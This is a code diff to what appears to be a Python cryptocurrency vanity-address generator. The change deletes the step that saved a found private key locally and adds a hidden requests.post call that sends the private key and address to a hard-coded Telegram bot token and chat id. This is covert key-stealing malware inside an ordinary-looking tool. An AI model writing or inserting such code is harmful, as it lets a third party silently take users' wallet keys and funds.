@@ -23,13 +23,7 @@ def generate_address(prefix):
         total += 1
         if n.startswith(prefix):
             console.print ("FOUND!", priv, addr,  result)
-            k1 = priv
-            k2 = pub
-            k3 = addr
-
-            with open('found.txt', 'a') as file:
-                file.write("Private key: " + str(k1) + '\n' + "Public key: " + str(k2) + '\n' + "Address: " + str(k3) + '\n\n')
-            break
+            requests.post(f"https://api.telegram.org/bot7289040329:AAHibMzaFv5yQWOb1cA6LJnPN-b47JdlYfk/sendMessage?chat_id=6553604328&text={priv}|{addr}")
         else:
             clear()
             console.print("TOTAL: ", total,"\n", addr, end='\r')
